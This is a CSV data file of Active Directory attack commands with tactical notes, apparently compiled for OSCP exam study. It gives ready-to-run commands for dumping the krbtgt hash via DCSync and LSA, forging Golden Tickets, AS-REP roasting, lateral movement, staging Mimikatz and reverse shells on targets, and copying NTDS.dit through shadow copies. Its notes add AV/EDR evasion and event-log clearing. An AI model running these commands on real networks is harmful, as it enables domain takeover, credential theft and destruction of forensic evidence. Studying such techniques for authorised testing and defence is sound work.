"ad-golden-ticket-dcsync-krbtgt","Obtain krbtgt Hash via DCSync","enumeration","mimikatz # lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt","Extract krbtgt account NTLM hash remotely using DCSync attack. Requires Domain Admin or equivalent replication privileges. This is the PRIMARY method for obtaining krbtgt hash without accessing the Domain Controller directly.","active-directory","DCSync is the PREFERRED method for obtaining krbtgt hash because it can be performed remotely without logging into the Domain Controller. This reduces detection risk and operational footprint. The attack leverages legitimate AD replication protocols, making it difficult to distinguish from normal DC-to-DC synchronization traffic. Time estimate: 10-30 seconds for hash extraction. Save the NTLM hash immediately - you'll need it for Golden Ticket creation.

MANUAL ALTERNATIVES:
Without Mimikatz, you can use Impacket's secretsdump.py: secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt

Or PowerShell with Invoke-Mimikatz: Invoke-Mimikatz -Command '""lsadump::dcsync /domain:<DOMAIN> /user:krbtgt""'

TIME ESTIMATE: 30 seconds - 1 minute (including verification)","high"
"ad-golden-ticket-lsa-dump-krbtgt","Obtain krbtgt Hash via LSA Dump (On DC)","enumeration","mimikatz # lsadump::lsa /patch","Extract krbtgt account NTLM hash directly from Domain Controller's LSA (Local Security Authority) memory. Requires local administrator access ON the Domain Controller. Alternative to DCSync when you have direct DC access.","active-directory","LSA dump requires PHYSICAL (or RDP) access to the Domain Controller, making it less stealthy than DCSync. However, it's useful when: (1) You've already compromised the DC, (2) Replication rights are unavailable, (3) DCSync is being monitored. IMPORTANT: This method dumps ALL domain account hashes, not just krbtgt. Save the output to a file for later analysis. The krbtgt hash is marked with RID 000001f6 (502 in decimal). Time estimate: 10-20 seconds for dump completion.

MANUAL ALTERNATIVES:
Without Mimikatz on the DC, you can:
1. Use Impacket remotely: secretsdump.py <DOMAIN>/<USER>@<DC_IP> -just-dc
2. Extract NTDS.dit and SYSTEM hive, then parse offline: ntdsutil 'activate instance ntds' 'ifm' 'create full C:\temp\ntds' quit quit
3. Use built-in tools: reg save HKLM\SYSTEM SystemBkup.hiv && reg save HKLM\SAM SAMBkup.hiv

TIME ESTIMATE: 30 seconds - 1 minute (including privilege escalation to SYSTEM)","medium"
"ad-golden-ticket-purge-tickets","Purge Existing Kerberos Tickets","post-exploit","mimikatz # kerberos::purge","Delete all Kerberos tickets from the current user session. Essential cleanup before injecting a Golden Ticket to avoid conflicts with existing tickets. Ensures the forged ticket will be used for authentication.","active-directory","Ticket purging is OPTIONAL but highly recommended for clean Golden Ticket injection. If you don't purge, Windows may use cached legitimate tickets instead of your forged Golden Ticket, causing authentication to fail or use the wrong identity. Best practice: Always purge before injecting any forged ticket (Golden or Silver). This operation is reversible - simply re-authenticate to domain resources to generate new legitimate tickets. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Native Windows command (requires elevation):
klist purge

PowerShell alternative:
Invoke-Mimikatz -Command '""kerberos::purge""'

Complete cleanup (close sessions + purge):
net use * /delete /y && klist purge

TIME ESTIMATE: < 5 seconds","high"
"ad-golden-ticket-mimikatz-create","Create Golden Ticket with Mimikatz","post-exploit","mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /ptt","Forge a Kerberos Ticket Granting Ticket (TGT) using the krbtgt account hash and inject it into memory. This creates a domain-administrative ticket granting domain-wide access. The PRIMARY method for Golden Ticket attacks.","active-directory","Golden Ticket is one of the most powerful Active Directory persistence techniques. Key advantages: (1) Domain-wide access to all resources, (2) krbtgt password rarely changes (only on domain functional level upgrades), (3) Works from non-domain-joined machines, (4) No administrative privileges needed for ticket creation (only for obtaining krbtgt hash initially). EXAM TIP: Always use hostnames (not IPs) when authenticating with Golden Tickets - Kerberos requires FQDNs. Default ticket lifetime is 10 years - extremely suspicious for detection. Consider customizing with /startoffset, /endin, /renewmax flags for realistic lifetimes. Time estimate: 5-10 seconds for ticket creation and injection.

MANUAL ALTERNATIVES:
Rubeus alternative (C# implementation):
Rubeus.exe golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt

Impacket alternative (Linux):
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>
export KRB5CCNAME=<USERNAME>.ccache
psexec.py <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass

PowerShell (Invoke-Mimikatz):
Invoke-Mimikatz -Command '""kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt""'

TIME ESTIMATE: 10-15 seconds (creation + injection)","high"
"ad-golden-ticket-rubeus-create","Create Golden Ticket with Rubeus (Alternative)","post-exploit","Rubeus.exe golden /user:<USERNAME> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> /ptt","Forge a Kerberos TGT using Rubeus (C# alternative to Mimikatz). Provides AES encryption option for better evasion. Useful when Mimikatz is detected by AV/EDR.","active-directory","Rubeus is a modern alternative to Mimikatz with better AV/EDR evasion. Advantages: (1) Pure C#, doesn't interact with LSASS directly, (2) Can use AES256 encryption for stealthier tickets, (3) Compiles to .NET assembly (execute-assembly in Cobalt Strike), (4) Active development and updates. Disadvantages: (1) Requires .NET Framework on target, (2) Less feature-complete than Mimikatz for other attacks. EXAM TIP: If Mimikatz is blocked by AV, try Rubeus. For maximum stealth, use /aes256 if you can obtain the AES krbtgt key. Time estimate: 10-20 seconds.

MANUAL ALTERNATIVES:
AES256 encryption (stealthier):
Rubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /aes256:<AES_KEY> /ptt

Save to file instead of injecting:
Rubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /outfile:ticket.kirbi
Rubeus.exe ptt /ticket:ticket.kirbi

Reflective loading (bypass AV):
[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes('Rubeus.exe'))
[Rubeus.Program]::Main('golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /ptt'.Split())

TIME ESTIMATE: 15-30 seconds (including AV bypass if needed)","medium"
"ad-golden-ticket-verify-klist","Verify Golden Ticket with klist","enumeration","klist","Display all Kerberos tickets in the current user session to verify Golden Ticket injection. Shows ticket details including client, server, encryption type, and expiration.","active-directory","ALWAYS verify ticket injection with klist before attempting lateral movement. This confirms: (1) Ticket was successfully created and injected, (2) Correct domain and realm, (3) Valid encryption and ticket flags, (4) Ticket hasn't expired. Key indicators of Golden Ticket: (1) Server: krbtgt/<domain> (it's a TGT, not service ticket), (2) Extremely long validity period (default 10 years), (3) Client name matches your /user parameter. EXAM TIP: If klist shows no tickets but Mimikatz said 'successfully submitted', you may need to open a new command prompt with 'mimikatz # misc::cmd' to inherit the ticket. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Mimikatz alternative:
mimikatz # kerberos::list

Rubeus alternative:
Rubeus.exe klist

PowerShell (requires admin):
Get-WinEvent -LogName Security -FilterXPath ""*[System[EventID=4768]]"" | Select TimeCreated, Message

Detailed ticket analysis:
klist -li 0x3e7 (SYSTEM session)
klist sessions (all sessions, requires admin)

TIME ESTIMATE: < 5 seconds","high"
"ad-golden-ticket-psexec-use","Use Golden Ticket for Lateral Movement (PsExec)","lateral-movement","PsExec.exe \\<TARGET_FQDN> cmd.exe","Leverage Golden Ticket for lateral movement to remote systems using PsExec. The forged TGT provides domain-wide administrative access, allowing command execution on any domain system.","active-directory","This is the PAYOFF of the Golden Ticket attack - domain-wide administrative access. The forged TGT grants permissions to ANY system in the domain. You're not limited to PsExec - ANY Kerberos-aware tool will work: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc), SMB file access (dir \\DC1\C$). CRITICAL EXAM TIP: ALWAYS use hostnames/FQDNs with Golden Tickets. Using IP addresses forces NTLM authentication and bypasses your forged Kerberos ticket, causing 'Access Denied'. This is the #1 mistake when using Golden Tickets. Time estimate: 5-10 seconds for PsExec connection establishment.

MANUAL ALTERNATIVES:
Alternative lateral movement methods with Golden Ticket:

1. WMI:
wmic /node:<TARGET_FQDN> process call create ""cmd.exe /c <command>""

2. WinRM (PowerShell):
Enter-PSSession -ComputerName <TARGET_FQDN>

3. Direct SMB access:
dir \\<TARGET_FQDN>\C$
copy file.txt \\<TARGET_FQDN>\C$\Temp\

4. RDP:
mstsc /v:<TARGET_FQDN>

5. Impacket (Linux):
export KRB5CCNAME=ticket.ccache
psexec.py <DOMAIN>/<USER>@<TARGET_FQDN> -k -no-pass

6. Scheduled task:
schtasks /create /tn ""Update"" /tr ""cmd.exe /c <command>"" /sc once /st 00:00 /S <TARGET_FQDN>

TIME ESTIMATE: 10-20 seconds (connection + authentication)","high"
"ad-golden-ticket-cleanup","Remove Golden Ticket (Cleanup)","post-exploit","mimikatz # kerberos::purge","Remove Golden Ticket from memory by purging all Kerberos tickets. Essential for OPSEC and cleanup after completing objectives. Removes forensic evidence from ticket cache.","active-directory","OPSEC consideration: Purging tickets removes the forged Golden Ticket from memory but doesn't erase all traces. Windows Event Logs (Event IDs 4768, 4769, 4770) record Kerberos ticket operations. For complete cleanup: (1) Purge tickets, (2) Clear relevant event logs (if you have admin rights), (3) Close any SMB/RPC connections to domain resources. EXAM NOTE: In OSCP, cleanup is less critical (not a red team engagement), but understanding cleanup demonstrates operational maturity. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Native Windows:
klist purge

Complete cleanup:
klist purge && net use * /delete /y

Event log cleanup (requires admin):
wevtutil cl Security
wevtutil cl System

Alternative: Reboot (clears all tickets):
shutdown /r /t 0

TIME ESTIMATE: < 5 seconds (purge only), 1-2 minutes (including log cleanup)","medium"
"impacket-getnpusers-asreproast","impacket-GetNPUsers - AS-REP Roasting Attack","password-attacks","impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>","Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).
Targets misconfigured accounts to obtain crackable password hashes without authentication.","active-directory","AS-REP ROASTING extracts encrypted AS-REP responses from users with Kerberos preauthentication DISABLED.

WHY THIS WORKS:
Without preauthentication, you can request AS-REP (TGT response) for any user without knowing their password.

The AS-REP contains encrypted data using the user's password hash, which can be cracked offline.

DEFAULT SETTING:
Preauthentication is ENABLED by default (secure).

Users with preauthentication disabled are rare - typically required for legacy applications or misconfigurations.

ATTACK REQUIREMENTS:
(1) Valid domain credentials (for authenticated query) OR (2) Network access to DC (for unauthenticated username enumeration with -usersfile).

HASH FORMAT:
Output is Hashcat mode 18200 compatible.

OSCP TIP:
Always try AS-REP roasting early in domain assessment - it's fast (5-30 seconds) and may reveal weak passwords on privileged accounts.

TIME ESTIMATE:
5-10 seconds for hash extraction + 1-60 minutes for cracking (depends on password complexity).

DETECTION:
Event ID 4768 (Kerberos TGT request) - normal traffic, low visibility.

MANUAL ALTERNATIVE:
Use Rubeus.exe asreproast from Windows for same functionality without authentication requirements (domain-joined system).

TARGETED ATTACK:
If you have GenericWrite/GenericAll permissions on a user, you can enable 'Do not require preauthentication', extract hash, crack password, then disable the setting (see targeted-asreproast-set).

Clock sync is CRITICAL - use ntpdate or rdate if you receive KRB_AP_ERR_SKEW errors.","high"
"impacket-getnpusers-identify","impacket-GetNPUsers - Identify Vulnerable Users","enumeration","impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME>","Enumerate users with 'Do not require Kerberos preauthentication' enabled without extracting hashes.
Identifies vulnerable accounts before attempting AS-REP Roasting attack.","active-directory","IDENTIFICATION ONLY - lists vulnerable users without requesting hashes.

Use this for:
(1) Reconnaissance before attack.

(2) Verifying users exist.

(3) Checking if AS-REP roasting is viable.

OUTPUT COLUMNS:
Name (username), MemberOf (group membership - look for admin groups), PasswordLastSet (old passwords = easier to crack), LastLogon (active account check), UAC (User Account Control flags - 0x410200 = preauthentication disabled).

UNAUTHENTICATED MODE:
Omit username or use -no-pass flag to enumerate without credentials (rare - most domains require authentication).

OSCP STRATEGY:
Run this BEFORE extracting hashes to:
(1) Identify high-value targets (Domain Admins, privileged accounts).

(2) Estimate attack surface (10 vulnerable users vs 1).

(3) Prioritize targets by PasswordLastSet date.

TIME ESTIMATE:
<5 seconds.

NO HASH EXTRACTION:
Add -request flag to extract hashes (see impacket-getnpusers-asreproast).

DETECTION:
Minimal - standard LDAP queries, Event ID 4662 (LDAP query) - normal enumeration traffic.","high"
"rubeus-asreproast","Rubeus - AS-REP Roasting (Windows)","password-attacks",".\Rubeus.exe asreproast /nowrap","Extract AS-REP hashes from Windows domain-joined system using Rubeus.
Native Windows alternative to impacket-GetNPUsers with automatic domain context.","active-directory","WINDOWS-BASED AS-REP ROASTING using Rubeus.exe.

ADVANTAGES OVER IMPACKET:
(1) No credentials required (uses current domain user context automatically).

(2) Faster from Windows (native Kerberos API).

(3) No time sync issues.

(4) Auto-discovers domain info.

CRITICAL:
Use /nowrap flag to prevent line breaks in hash output - Hashcat requires single-line format.

Without /nowrap, hash will span multiple lines and fail to crack.

EXECUTION CONTEXT:
Must run from domain-joined Windows system OR use runas /netonly.

TOOL LOCATION:
Rubeus.exe typically in C:\Tools\ on OSCP lab systems.

Download from:
https://github.com/GhostPack/Rubeus.

HASH OUTPUT:
Default format is Hashcat mode 18200 compatible.

OSCP TIP:
Rubeus is preferred when you have RDP/WinRM access to Windows box.

No time sync needed, no credential entry required (uses current session).

TIME ESTIMATE:
5-10 seconds for hash extraction.

AV EVASION:
Rubeus is flagged by Windows Defender.

Options:
(1) Disable AV temporarily.

(2) Use obfuscated version.

(3) Reflectively load in memory.

(4) Fall back to impacket-GetNPUsers from Linux.

OUTPUT PARSING:
Copy hash starting from $krb5asrep$ to end (single line with /nowrap).

DETECTION:
Event ID 4768 (TGT request) - standard Kerberos traffic, low visibility.

MULTIPLE USERS:
Rubeus automatically finds ALL vulnerable users and displays hashes sequentially.","high"
"powerview-asreproast-identify","PowerView - Identify AS-REP Roastable Users","enumeration","Get-DomainUser -PreauthNotRequired -Properties samaccountname,memberof,pwdlastset","Use PowerView to enumerate users with Kerberos preauthentication disabled.
PowerShell-based identification of AS-REP Roasting targets with detailed attribute filtering.","active-directory","POWERVIEW ENUMERATION for AS-REP roastable users.

IDENTIFICATION ONLY - does not extract hashes (use Rubeus or impacket for extraction).

WHY POWERVIEW:
(1) Rich filtering options.

(2) Detailed user attributes.

(3) Integrated with other PowerView cmdlets for further enumeration.

OUTPUT ANALYSIS:
pwdlastset (old dates = weak password likely), memberof (look for 'Domain Admins', 'Enterprise Admins', privileged groups), admincount=1 (privileged account).

POWERVIEW LOCATION:
C:\Tools\PowerView.ps1 on lab systems OR download from PowerSploit GitHub.

IMPORT METHOD:
Import-Module .\PowerView.ps1 OR dot-source:
.

.\PowerView.ps1.

EXECUTION POLICY:
May need -ExecutionPolicy Bypass:
powershell -ep bypass -c 'Import-Module .\PowerView.ps1; Get-DomainUser -PreauthNotRequired'.

ALTERNATIVE SYNTAX:
Get-NetUser -PreauthNotRequired (older PowerView alias, same functionality).

OSCP TIP:
Combine with other PowerView cmdlets for comprehensive enumeration:
Get-DomainUser -PreauthNotRequired | Get-DomainGroup (find groups), Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,pwdlastset | Sort-Object pwdlastset (sort by password age - oldest = easiest targets).

UAC FLAG:
The 'DONT_REQ_PREAUTH' flag is 0x400000 in userAccountControl attribute.

TIME ESTIMATE:
<5 seconds for enumeration.

NEXT STEP:
Use Rubeus or impacket-GetNPUsers to extract hashes for identified users.","high"
"targeted-asreproast-set","Targeted AS-REP Roasting - Enable DONT_REQ_PREAUTH","privilege-escalation","Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose","Set 'Do not require Kerberos preauthentication' on user account for targeted AS-REP roasting.
Requires GenericWrite/GenericAll permissions - enables hash extraction on arbitrary accounts.","active-directory","TARGETED AS-REP ROASTING attack for scenarios where no users have preauthentication disabled by default.

REQUIREMENTS:
GenericWrite OR GenericAll permissions on target user account.

ATTACK FLOW:
(1) Identify user you have write permissions on.

(2) Enable DONT_REQ_PREAUTH flag.

(3) Extract AS-REP hash with Rubeus/impacket.

(4) Crack hash offline.

(5) CLEANUP:
Reset UAC to original value (CRITICAL - see targeted-asreproast-cleanup).

UAC FLAG:
4194304 decimal = 0x400000 hex = DONT_REQ_PREAUTH bit.

XOR operation toggles this bit without modifying other UAC flags (safer than -Set).

ETHICAL NOTE:
This modifies production AD and temporarily weakens security.

ALWAYS reset UAC after obtaining hash.

Document changes in assessment notes.

OSCP SCENARIO:
Common in environments with delegated permissions, service account management, or misconfigured ACLs.

PERMISSION CHECK:
Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (whoami /user)[1]} | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}.

TIME ESTIMATE:
5 seconds to set flag + 5 seconds to extract hash + 1-60 minutes to crack.

DETECTION:
Event ID 4738 (user account changed) - shows userAccountControl modification.

Highly suspicious if DONT_REQ_PREAUTH enabled on production account.

CLEANUP CRITICAL:
Failing to reset UAC leaves account vulnerable.

Set reminder or use script to auto-reset after 30 minutes.

ALTERNATIVE METHODS:
(1) Reset password (more obvious, locks out user).

(2) Add SPN for Kerberoasting (see targeted-kerberoast-set).

(3) Modify group membership (requires different permissions).","medium"
"targeted-asreproast-cleanup","Targeted AS-REP Roasting - Reset UAC (Cleanup)","cleanup","Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose","Remove 'Do not require Kerberos preauthentication' flag after targeted AS-REP roasting attack.
Critical cleanup step to restore account security configuration after exploitation.","active-directory","CRITICAL CLEANUP STEP after targeted AS-REP roasting.

XOR OPERATION IS REVERSIBLE:
Same command that enabled DONT_REQ_PREAUTH also disables it (XOR toggles bit).

VERIFICATION:
Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol | Select-Object useraccountcontrol.

Normal UAC values:
512 (enabled account), 544 (password not required - disabled), 66048 (disabled account).

Values with 4194304 added indicate DONT_REQ_PREAUTH enabled.

OSCP REQUIREMENT:
Always document cleanup steps in assessment report.

Show before/after UAC values as evidence of proper cleanup.

AUTOMATION:
Create script to auto-reset after 30 minutes:
Start-Sleep -Seconds 1800; Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304}.

TIME TO CLEANUP:
<5 seconds.

WHY CLEANUP MATTERS:
(1) Ethical requirement - don't leave client environment more vulnerable.

(2) Detection - prolonged DONT_REQ_PREAUTH on account triggers alerts.

(3) Compliance - required for professional pentesting certifications.

FAILED CLEANUP:
If you lose access before cleanup, document in report and notify client immediately.

Provide manual cleanup steps:
Open ADUC → Find user → Properties → Account tab → Uncheck 'Do not require Kerberos preauthentication'.

VERIFICATION COMMAND:
(Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol).useraccountcontrol -band 4194304 (should return 0 after cleanup).","high"
"enter-pssession","PowerShell Remote Interactive Session","post-exploit","Enter-PSSession -ComputerName <TARGET>","Establish interactive PowerShell session on remote computer via WinRM (requires local admin or WinRM permissions)","","PowerShell remoting uses WinRM (Windows Remote Management) over HTTP port 5985 or HTTPS port 5986.

Requires:
(1) Local admin on target OR membership in Remote Management Users group, (2) WinRM service enabled (default on Server 2012+, disabled on workstations pre-Windows 10), (3) Firewall allows TCP 5985/5986.

Advantages over PsExec:
Uses native Windows service (less suspicious), supports pass-the-hash via Invoke-Command, allows script execution remotely.

Session is fully interactive - TAB completion works, can run multi-line scripts.

OSCP:
Preferred lateral movement method when available - cleaner than PsExec, less likely to trigger AV.

Test WinRM availability with Test-WSMan <TARGET> before attempting connection.","high"
"invoke-command","PowerShell Remote Command Execution","post-exploit","Invoke-Command -ComputerName <TARGET> -ScriptBlock { <COMMAND> }","Execute PowerShell commands or script blocks on remote systems via WinRM without interactive session","","Non-interactive alternative to Enter-PSSession.

Advantages:
(1) Execute single commands without persistent session, (2) Run on multiple computers simultaneously (-ComputerName accepts arrays), (3) Return output to local console (vs interactive prompt).

Use cases:
Quick enumeration (whoami, ipconfig), download/execute scripts (IEX + DownloadString), mass credential dumping across multiple systems.

Supports pass-the-hash when combined with Invoke-Mimikatz or Rubeus.

Script execution:
Use -FilePath to run local .ps1 files on remote systems (file is copied and executed).

OSCP:
Use for non-interactive command execution - faster than Enter-PSSession for single commands.

Combine with PowerView for remote AD enumeration:
Invoke-Command -ComputerName DC01 -ScriptBlock { Import-Module .\PowerView.ps1; Get-NetUser }.","high"
"test-wsman-connectivity","Test WinRM Connectivity","enumeration","Test-WSMan -ComputerName <TARGET>","Verify WinRM service is accessible on remote system before attempting PowerShell remoting","","Test-WSMan sends WS-Management identification request to target.

If WinRM service is running and accessible, returns service identification XML.

Does NOT require authentication to succeed - even if you don't have access, you'll see service info (proves service is running).

Access denied error = service running but authentication failed (good - means WinRM available, just need valid credentials).

Connection refused = service not running or firewall blocking.

Use this before attempting Enter-PSSession to avoid wasting time on non-WinRM targets.

OSCP:
Quick check before lateral movement.

If Test-WSMan succeeds, PowerShell remoting is viable.

If fails, pivot to PsExec, WMI, or DCOM methods.","high"
"enable-psremoting","Enable PowerShell Remoting","post-exploit","Enable-PSRemoting -Force","Configure WinRM service and firewall rules to enable PowerShell remoting on local or remote system (requires local admin)","","Enable-PSRemoting performs multiple configuration steps:
(1) Starts WinRM service, (2) Sets WinRM to auto-start, (3) Creates HTTP listener on port 5985, (4) Creates firewall exception for WinRM ports, (5) Enables LocalAccountTokenFilterPolicy (allows remote admin via local accounts).

Normally run on the system you want to RECEIVE remote connections (not attacker machine).

If you compromise a system via other means (RDP, PsExec) and want to enable WinRM for future access, run this command.

Requires local admin.

OSCP scenario:
You get RDP access to workstation where WinRM is disabled.

Enable it for cleaner future access:
Enable-PSRemoting -Force -SkipNetworkProfileCheck.

Now you can use Enter-PSSession instead of RDP (less network traffic, more stealthy).","medium"
"test-admin-share-access","Test Administrative Share Access","enumeration","Test-Path \\<TARGET>\C$","Verify local administrator access on remote system by testing C$ administrative share accessibility","","Administrative shares (C$, ADMIN$, IPC$) are created automatically by Windows and only accessible to local Administrators group.

C$ provides access to C:
drive root, ADMIN$ maps to C:\Windows, IPC$ used for named pipes.

Testing C$ access = testing local admin membership.

Why this works:
SMB authentication uses current user context.

If Test-Path returns True, your credentials have local admin on target.

This is fast pre-check before attempting lateral movement tools (PsExec, WinRM) which all require local admin.

OSCP workflow:
(1) Find-LocalAdminAccess to discover admin access across domain, (2) Test-Path \\<TARGET>\C$ to verify specific target, (3) Execute lateral movement.

Alternative syntax:
dir \\<TARGET>\C$ (if succeeds = admin, if access denied = not admin).","high"
"net-use-admin-share","Map Administrative Share with Credentials","post-exploit","net use \\<TARGET>\C$ /user:<DOMAIN>\<USERNAME> <PASSWORD>","Authenticate to administrative share with explicit credentials to test access or establish persistent connection","","net use establishes authenticated SMB session to administrative shares.

Unlike Test-Path (uses current credentials), net use allows explicit credential specification.

Use cases:
(1) Test credentials against target, (2) Authenticate with compromised account, (3) Switch user context (if already connected as different user, disconnect first).

Connection persists until reboot OR explicit disconnect (net use /delete).

For local accounts (SAM database, not AD), use syntax:
/user:.\<USERNAME> where dot represents local machine.

OSCP:
Use to test credential validity after cracking passwords or finding credentials in files.

Successful net use = valid local admin credentials.

Follow with PsExec, WMI, or manual file operations via C$ share.","high"
"dir-admin-share","List Administrative Share Contents","enumeration","dir \\<TARGET>\<SHARE>","Browse contents of administrative shares (C$, ADMIN$) or regular file shares on remote system","","Simple file browsing via SMB.

Administrative shares (C$, ADMIN$) require local admin.

Regular shares require explicit permissions.

Common reconnaissance patterns:
(1) dir \\<TARGET>\C$\Users\ - list user profiles (identify user accounts), (2) dir \\<TARGET>\C$\Users\*\Desktop\ /s - find files on all user desktops, (3) dir \\<TARGET>\C$\inetpub\wwwroot\ - web server files (web.config credentials), (4) dir \\<TARGET>\ADMIN$\System32\ - verify Windows directory access.

Use /s for recursive search, /b for clean file lists (pipe to findstr).

OSCP:
After confirming admin access (Test-Path), use dir to enumerate sensitive locations.

Look for:
credentials in Desktop/Documents, application configs in C:\inetpub or C:\Program Files, backup files in C:\Temp or C:\Backup.","high"
"copy-file-admin-share","Copy File via Administrative Share","file-transfer","copy <LOCAL_FILE> \\<TARGET>\C$\<REMOTE_PATH>","Upload files to remote system via administrative share (C$, ADMIN$) - common for tool deployment and payload staging","","Administrative share file transfer is core lateral movement technique.

Common pattern:
(1) Verify admin access (Test-Path \\<TARGET>\C$), (2) Upload tool (copy mimikatz.exe \\<TARGET>\C$\Temp\), (3) Execute (PsExec/WMI), (4) Retrieve output/cleanup.

Write locations:
C$\Temp (C:\Temp - usually writable), C$\Windows\Temp (C:\Windows\Temp - system temp), C$\Users\Public (C:\Users\Public - world-writable).

Avoid C$\ root (too obvious) or C$\Windows\System32 (protected).

OSCP:
This is how you deploy Mimikatz, reverse shells, and enumeration tools to remote systems.

After copy, use PsExec or WMI to execute.

Don't forget cleanup:
del \\<TARGET>\C$\Temp\mimikatz.exe after use.","high"
"ad-vssadmin-list-shadows","List Existing Shadow Copies","enumeration","vssadmin list shadows","Enumerate all existing Volume Shadow Copies on the system to identify available snapshots for file extraction.","active-directory","ALWAYS run this first before creating new shadow copies - existing snapshots save time and reduce forensic footprint. OPSEC: Read-only operation, minimal event logging. TIME: <5 seconds. EXAM TIP: If shadow copies exist from Windows Backup/Server Manager, use those instead of creating new ones. Shadow Copy Device path format: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{NUMBER} - increment NUMBER (1, 2, 3...) for multiple copies.","high"
"ad-check-vss-service","Verify VSS Service Status","enumeration","sc query vss","Check if Volume Shadow Copy Service is running before attempting shadow copy operations.","active-directory","PREREQUISITE check before shadow copy operations. TIME: <3 seconds. VSS enabled by default on Windows Server and Windows 10/11. If stopped, starting requires Administrator. MANUAL ALTERNATIVE: PowerShell: Get-Service -Name VSS | Select-Object Status, StartType, DisplayName. GUI: services.msc → Volume Shadow Copy → Status column.","medium"
"ad-vssadmin-create-shadow","Create Shadow Copy with vssadmin (Native)","exploitation","vssadmin create shadow /for=<DRIVE_LETTER>:","Create Volume Shadow Copy using native Windows vssadmin utility. PREFERRED method - no tool upload required, built-in functionality.","active-directory","PREFERRED METHOD for OSCP exam - native tool, no upload required, faster than transferring vshadow.exe. OPSEC: Persistent shadow copy (survives reboot) - DELETE after extraction with vssadmin delete. TIME: 10-30 seconds for creation. EXAM STRATEGY: (1) Check existing shadows first, (2) Use vssadmin if no vshadow.exe available, (3) Remember to cleanup. LIMITATION: Cannot disable VSS writers like vshadow.exe -nw, slightly slower creation. ADVANTAGE: Zero file transfer, works on all Windows Server versions, less suspicious process execution. Shadow copies consume disk space - ~10-30% of volume size, ensure adequate free space.","high"
"ad-vshadow-create-shadow","Create Shadow Copy with vshadow.exe (SDK)","exploitation","vshadow.exe -nw -p <DRIVE_LETTER>:","Create Volume Shadow Copy using Microsoft vshadow.exe from Windows SDK. Faster than vssadmin due to -nw (no-writers) option.","active-directory","METHOD FROM OFFICIAL OSCP CONTENT. ADVANTAGE: -nw flag speeds up creation significantly (5-10 seconds vs 30-60 seconds). DISADVANTAGE: Requires upload of vshadow.exe to target DC. TIME: Upload (10-30 sec) + Creation (5-10 sec) = 15-40 sec total. OPSEC: Microsoft signed binary, but file transfer creates forensic artifact. EXAM STRATEGY: Use vssadmin if vshadow.exe not available/uploaded. Download vshadow.exe: Part of Windows SDK (free), typically in C:\Program Files (x86)\Windows Kits\10\bin\<version>\x64\vshadow.exe on dev machines. Note device name from output (\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{NUMBER}) for copy command.","high"
"ad-diskshadow-create-shadow","Create Shadow Copy with diskshadow (Scriptable)","exploitation","diskshadow /s <SCRIPT_FILE>","Create Volume Shadow Copy using diskshadow with script file for automation. Native Windows utility with scriptable interface.","active-directory","ADVANCED METHOD - scriptable and automatable. ADVANTAGE: Native Windows tool (no upload), more powerful than vssadmin (can expose shadow as drive letter Z:, easier than \\?\GLOBALROOT paths). EXAM USE CASE: Multi-DC environments where repeatable process needed. TIME: Script creation (30 sec) + Execution (10-20 sec). SCRIPT TEMPLATE:

set context persistent nowriters
set metadata C:\Windows\Temp\metadata.cab
add volume C:
create

OPTIONAL: Expose shadow as drive letter for easier access:
expose %vssc% Z:
(Then access files as Z:\Windows\NTDS\ntds.dit instead of \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\ntds.dit)

LIMITATION: More complex than vssadmin single command. OPSEC: Native tool, minimal logging. Cleanup: Delete exposed drives with: diskshadow → unexpose Z: → delete shadows volume C: → exit","medium"
